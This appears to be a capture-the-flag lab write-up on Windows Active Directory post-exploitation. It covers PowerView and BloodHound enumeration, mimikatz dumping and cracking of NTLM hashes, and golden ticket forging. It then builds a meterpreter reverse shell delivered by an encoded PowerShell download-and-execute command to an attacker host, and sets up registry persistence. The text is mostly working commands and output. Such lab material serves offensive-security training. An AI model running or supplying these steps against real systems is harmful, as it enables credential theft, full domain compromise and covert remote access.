# POST Exploitation

### Enumeration with Powerview
- disable execution policy
```bat
powershell -ep bypass
```

- run powerview
```bat
Get-NetUser | select cn
```
- enum users

```bat
PS C:\Users\Administrator\Downloads> Get-NetUser |select cn

cn
--
Administrator
Guest
krbtgt
Machine-1
Admin2
Machine-2
SQL Service
POST{P0W3RV13W_FTW}
sshd

```

- enum groups

```bat
PS C:\Users\Administrator\Downloads> Get-NetGroup -GroupName *admin*
Administrators 
Hyper-V Administrators
Storage Replica Administrators
Schema Admins
Enterprise Admins
Domain Admins 
Key Admins
Enterprise Key Admins
DnsAdmins

```

- enum share 

```bat
PS C:\Users\Administrator\Downloads> Invoke-ShareFinder
\\Domain-Controller.CONTROLLER.local\ADMIN$     - Remote Admin 
\\Domain-Controller.CONTROLLER.local\C$         - Default share       
\\Domain-Controller.CONTROLLER.local\IPC$       - Remote IPC
\\Domain-Controller.CONTROLLER.local\NETLOGON   - Logon server share  
\\Domain-Controller.CONTROLLER.local\Share      -
\\Domain-Controller.CONTROLLER.local\SYSVOL     - Logon server share  

```


- enum OS

```bat
PS C:\Users\Administrator\Downloads> Get-NetComputer -fulldata | select operatin
gsystem

operatingsystem
---------------
Windows Server 2019 Standard
Windows 10 Enterprise Evaluation      
Windows 10 Enterprise Evaluation      

```


### Enumeration with Bloodhound

- install and configure
```bash
apt-get install bloodhound
neo4j console

- default credentials -> neo4j:neo4j

```

- run bloodhound (sharphound) to collect data
```bat
controller\administrator@DOMAIN-CONTROLL C:\Users\Administrator\Downloads>powers
hell -ep bypass
Windows PowerShell 
Copyright (C) Microsoft Corporation. All rights reserved.

PS C:\Users\Administrator\Downloads> . .\SharpHound.ps1
---------------------------------------------------------------------------------
PS C:\Users\Administrator\Downloads> Invoke-Bloodhound -CollectionMethod All -Do
main CONTROLLER.local -ZipFileName 1337.zip


Mode                LastWriteTime         Length Name
----                -------------         ------ ----
-a----       12/18/2021   1:23 AM           9542 20211218012319_1337.zip        
-a----        5/14/2020  11:39 AM        1261832 mimikatz.exe
-a----        5/14/2020  11:41 AM         374625 PowerView.ps1
-a----        5/14/2020  11:43 AM         973325 SharpHound.ps1
-a----       12/18/2021   1:23 AM          11709 YmM2MWQ1NzYtYWFhYS00MjM1LThjYm 
                                                 QtYTE4ZDM4ZGFiNTFl.bin




```



### Dumping hash with mimkatz

1. run mimikatz
```bat
controller\administrator@DOMAIN-CONTROLL C:\Users\Administrator\Downloads>.\mimikatz.exe

  .#####.   mimikatz 2.2.0 (x64) #18362 May  2 2020 16:23:51
 .## ^ ##.  "A La Vie, A L'Amour" - (oe.eo)
 ## / \ ##  /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )  
 ## \ / ##       > http://blog.gentilkiwi.com/mimikatz
 '## v ##'       Vincent LE TOUX             ( vincent.letoux@gmail.com ) 
  '#####'        > http://pingcastle.com / http://mysmartlogon.com   ***/ 

mimikatz # privilege::debug 
Privilege '20' OK 
```

2. dump hashes
```bat
mimikatz # lsadump::lsa /patch 
Domain : CONTROLLER / S-1-5-21-849420856-2351964222-986696166 
 
RID  : 000001f4 (500)
User : Administrator
LM   :
NTLM : 2777b7fec870e04dda00cd7260f7bee6

RID  : 000001f5 (501)
User : Guest
LM   :
NTLM :

RID  : 000001f6 (502)
User : krbtgt
LM   :
NTLM : 5508500012cc005cf7082a9a89ebdfdf

RID  : 0000044f (1103)
User : Machine1
LM   :
NTLM : 64f12cddaa88057e06a81b54e73b949b

RID  : 00000451 (1105)
User : Admin2
LM   :
NTLM : 2b576acbe6bcfda7294d6bd18041b8fe

RID  : 00000452 (1106)
User : Machine2
LM   :
NTLM : c39f2beb3d2ec06a62cb887fb391dee0

RID  : 00000453 (1107)
User : SQLService
LM   :
NTLM : f4ab68f27303bcb4024650d8fc5f973a

RID  : 00000454 (1108)
User : POST
LM   :
NTLM : c4b0e1b10c7ce2c4723b4e2407ef81a2

RID  : 00000457 (1111)
User : sshd
LM   :
NTLM : 2777b7fec870e04dda00cd7260f7bee6

RID  : 000003e8 (1000)
User : DOMAIN-CONTROLL$
LM   :
NTLM : 93fb9c3d0e6afef38372454863d6ad73

RID  : 00000455 (1109)
User : DESKTOP-2$
LM   :
NTLM : 3c2d4759eb9884d7a935fe71a8e0f54c

RID  : 00000456 (1110)
User : DESKTOP-1$
LM   :
NTLM : 7d33346eeb11a4f12a6c201faaa0d89a


```


3. crack Hashes using hashcat 
```bash
hashcat -m 1000 hashes ../Desktop/Tools/wordlists/rockyou.txt 


Administrator:2777b7fec870e04dda00cd7260f7bee6:P@$$W0rd
Machine1:64f12cddaa88057e06a81b54e73b949b:Password1
Machine2:c39f2beb3d2ec06a62cb887fb391dee0:Password2
SQLService:f4ab68f27303bcb4024650d8fc5f973a:MYpassword123#
POST:c4b0e1b10c7ce2c4723b4e2407ef81a2:Password3

```


### Golden Ticket attacks with mimkatz

*dump hash and sid for krbtgt user to create tgt allow to access any machine*
. requirement
- hash for krbtgt user
- SID for krbtgt user


1. run mimkatz

```bat
controller\administrator@DOMAIN-CONTROLL C:\Users\Administrator\Downloads>.\mimikatz.exe

  .#####.   mimikatz 2.2.0 (x64) #18362 May  2 2020 16:23:51
 .## ^ ##.  "A La Vie, A L'Amour" - (oe.eo)
 ## / \ ##  /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )  
 ## \ / ##       > http://blog.gentilkiwi.com/mimikatz
 '## v ##'       Vincent LE TOUX             ( vincent.letoux@gmail.com ) 
  '#####'        > http://pingcastle.com / http://mysmartlogon.com   ***/ 

mimikatz # privilege::debug 
Privilege '20' OK 
```
2. dump krbtgt user hash

```bat
mimikatz # lsadump::lsa  /inject /name:krbtgt 
Domain : CONTROLLER / S-1-5-21-849420856-2351964222-986696166 

RID  : 000001f6 (502)
User : krbtgt

 * Primary
    NTLM : 5508500012cc005cf7082a9a89ebdfdf
    LM   :
  Hash NTLM: 5508500012cc005cf7082a9a89ebdfdf
    ntlm- 0: 5508500012cc005cf7082a9a89ebdfdf
    lm  - 0: 372f405db05d3cafd27f8e6a4a097b2c

 * WDigest
    01  49a8de3b6c7ae1ddf36aa868e68cd9ea
    02  7902703149b131c57e5253fd9ea710d0 
    03  71288a6388fb28088a434d3705cc6f2a
    04  49a8de3b6c7ae1ddf36aa868e68cd9ea
    05  7902703149b131c57e5253fd9ea710d0
    06  df5ad3cc1ff643663d85dabc81432a81
    07  49a8de3b6c7ae1ddf36aa868e68cd9ea
    08  a489809bd0f8e525f450fac01ea2054b
    09  19e54fd00868c3b0b35b5e0926934c99
    10  4462ea84c5537142029ea1b354cd25fa
    11  6773fcbf03fd29e51720f2c5087cb81c
    12  19e54fd00868c3b0b35b5e0926934c99 
    13  52902abbeec1f1d3b46a7bd5adab3b57
    14  6773fcbf03fd29e51720f2c5087cb81c
    15  8f2593c344922717d05d537487a1336d
    16  49c009813995b032cc1f1a181eaadee4
    17  8552f561e937ad7c13a0dca4e9b0b25a
    18  cc18f1d9a1f4d28b58a063f69fa54f27
    19  12ae8a0629634a31aa63d6f422a14953
    20  b6392b0471c53dd2379dcc570816ba10
    21  7ab113cb39aa4be369710f6926b68094
    22  7ab113cb39aa4be369710f6926b68094
    23  e38f8bc728b21b85602231dba189c5be 
    24  4700657dde6382cd7b990fb042b00f9e
    25  8f46d9db219cbd64fb61ba4fdb1c9ba7
    26  36b6a21f031bf361ce38d4d8ad39ee0f
    27  e69385ee50f9d3e105f50c61c53e718e
    28  ca006400aefe845da46b137b5b50f371
    29  15a607251e3a2973a843e09c008c32e3

 * Kerberos
    Default Salt : CONTROLLER.LOCALkrbtgt
    Credentials
      des_cbc_md5       : 64ef5d43922f3b5d

 * Kerberos-Newer-Keys 
    Default Salt : CONTROLLER.LOCALkrbtgt
    Default Iterations : 4096
    Credentials
      aes256_hmac       (4096) : 8e544cabf340db750cef9f5db7e1a2f97e465dffbd5a2dc64246bda3c75fe53d
      aes128_hmac       (4096) : 7eb35bddd529c0614e5ad9db4c798066
      des_cbc_md5       (4096) : 64ef5d43922f3b5d

 * NTLM-Strong-NTOWF
    Random Value : 666caaaaf30081f30211bd7fa445fec4

mimikatz #

```



3. create Golden ticket 

```bat 
kerberos::golden /user: /domain: /sid: /krbtgt: /id:
```

|Option|description|
|-|-|
|kerberos::golden|choose kerberos ticket |
|/user|username(administrator)|
|/domain|domain name|
|/sid|SID for user (KRBTGT)|
|/krbtgt|ntlm hash for KRBTGT user|
|/id|id number (500 its high privilege)|


```bat
mimikatz # kerberos::golden /user:administrator /domain:CONTROLLER.local /sid:S-1-5-21-849420856-2351964222-986696166 /krbtgt:5508500012cc005cf7082a9a
89ebdfdf /id:500  
User      : administrator 
Domain    : CONTROLLER.local (CONTROLLER)
SID       : S-1-5-21-849420856-2351964222-986696166
User Id   : 500
Groups Id : *513 512 520 518 519
ServiceKey: 5508500012cc005cf7082a9a89ebdfdf - rc4_hmac_nt
Lifetime  : 12/18/2021 2:33:33 AM ; 12/16/2031 2:33:33 AM ; 12/16/2031 2:33:33 AM
-> Ticket : ticket.kirbi

 * PAC generated
 * PAC signed
 * EncTicketPart generated
 * EncTicketPart encrypted
 * KrbCred generated

Final Ticket Saved to file !

```

4. use golden ticket to access machines

```bat 
mimikatz # misc::cmd 
Patch OK for 'cmd.exe' from 'DisableCMD' to 'KiwiAndCMD' @ 00007FF63D5543B8 
mimikatz #

```




### maintaining access

1. create meterpreter shell using unicron 
```bash
python unicorn.py windows/meterpreter/reverse_https 10.10.170.40 443

```
2. create powershell encode command to invoke unicron payload
```bash
echo "iex(New-Object Net.Webclient).DownloadString('http://10.10.170.40:1337/rev.txt')"|iconv -t utf-16le|base64 -w 0


aQBlAHgAKABOAGUAdwAtAE8AYgBqAGUAYwB0ACAATgBlAHQALgBXAGUAYgBjAGwAaQBlAG4AdAApAC4ARABvAHcAbgBsAG8AYQBkAFMAdAByAGkAbgBnACgAJwBoAHQAdABwADoALwAvADEAMAAuADEAMAAuADEANwAwAC4ANAAwADoAMQAzADMANwAvAHIAZQB2AC4AdAB4AHQAJwApAAoAroot@ip-10-10-170-40:~/AD/www# 

python3 -m http.server 1337


```

3. run powershell command and pass encode payload

```bat
powershell -ep bypass -enc aQBlAHgAKABOAGUAdwAtAE8AYgBqAGUAYwB0ACAATgBlAHQAL
gBXAGUAYgBjAGwAaQBlAG4AdAApAC4ARABvAHcAbgBsAG8AYQBkAFMAdAByAGkAbgBnACgAJwBoAHQAdABwADoALwAvADEAMAAuADEAMAAuADEANwAwAC4ANAAwADoAMQAzADMANwAvAHIAZQB2AC4AdAB4AHQAJwApAAoA
```

```bash
+ -- --=[ 2048 exploits - 1105 auxiliary - 344 post       ]
+ -- --=[ 562 payloads - 45 encoders - 10 nops            ]
+ -- --=[ 7 evasion                                       ]

Metasploit tip: Tired of setting RHOSTS for modules? Try globally setting it with setg RHOSTS x.x.x.x

[*] Processing unicorn.rc for ERB directives.
resource (unicorn.rc)> use multi/handler
[*] Using configured payload generic/shell_reverse_tcp
resource (unicorn.rc)> set payload windows/meterpreter/reverse_https
payload => windows/meterpreter/reverse_https
resource (unicorn.rc)> set LHOST 10.10.170.40
LHOST => 10.10.170.40
resource (unicorn.rc)> set LPORT 443
LPORT => 443
resource (unicorn.rc)> set ExitOnSession false
ExitOnSession => false
resource (unicorn.rc)> set AutoVerifySession false
AutoVerifySession => false
resource (unicorn.rc)> set AutoSystemInfo false
AutoSystemInfo => false
resource (unicorn.rc)> set AutoLoadStdapi false
AutoLoadStdapi => false
resource (unicorn.rc)> exploit -j
[*] Exploit running as background job 0.
[*] Exploit completed, but no session was created.
msf5 exploit(multi/handler) > 
[*] Started HTTPS reverse handler on https://10.10.170.40:443
[*] https://10.10.170.40:443 handling request from 10.10.39.246; (UUID: jpnxoisn) Staging x86 payload (177241 bytes) ...
[*] Meterpreter session 1 opened (10.10.170.40:443 -> 10.10.39.246:50397) at 2021-12-18 11:03:23 +0000


```

4. run maintaining access module `use exploit/windows/local/persistence`

```bash
msf5 exploit(windows/local/persistence) > show options 

Module options (exploit/windows/local/persistence):

   Name      Current Setting  Required  Description
   ----      ---------------  --------  -----------
   DELAY     10               yes       Delay (in seconds) for persistent payload to keep reconnecting back.
   EXE_NAME                   no        The filename for the payload to be used on the target host (%RAND%.exe by default).
   PATH                       no        Path to write payload (%TEMP% by default).
   REG_NAME                   no        The name to call registry value for persistence on target host (%RAND% by default).
   SESSION                    yes       The session to run this module on.
   STARTUP   USER             yes       Startup type for the persistent payload. (Accepted: USER, SYSTEM)
   VBS_NAME                   no        The filename to use for the VBS persistent script on the target host (%RAND% by default).


Payload options (windows/meterpreter/reverse_tcp):

   Name      Current Setting  Required  Description
   ----      ---------------  --------  -----------
   EXITFUNC  process          yes       Exit technique (Accepted: '', seh, thread, process, none)
   LHOST     10.10.170.40     yes       The listen address (an interface may be specified)
   LPORT     4444             yes       The listen port

   **DisablePayloadHandler: True   (no handler will be created!)**


Exploit target:

   Id  Name
   --  ----
   0   Windows


msf5 exploit(windows/local/persistence) > set SESSION 1
SESSION => 1

msf5 exploit(windows/local/persistence) > set session 1
session => 1
msf5 exploit(windows/local/persistence) > run

[*] Running persistent module against DOMAIN-CONTROLL via session ID: 1
[+] Persistent VBS script written on DOMAIN-CONTROLL to C:\Users\Administrator\AppData\Local\Temp\AnFxAiLONYwP.vbs
[*] Installing as HKCU\Software\Microsoft\Windows\CurrentVersion\Run\sFMrmlRyaX
[+] Installed autorun on DOMAIN-CONTROLL as HKCU\Software\Microsoft\Windows\CurrentVersion\Run\sFMrmlRyaX
[*] Clean up Meterpreter RC file: /root/.msf4/logs/persistence/DOMAIN-CONTROLL_20211218.1716/DOMAIN-CONTROLL_20211218.1716.rc
msf5 exploit(windows/local/persistence) > 

```



## Resources

[PowerSploit/PowerView.ps1 ](https://github.com/PowerShellMafia/PowerSploit/blob/master/Recon/PowerView.ps1)<br>
https://gist.github.com/HarmJ0y/184f9822b195c52dd50c379ed3117993
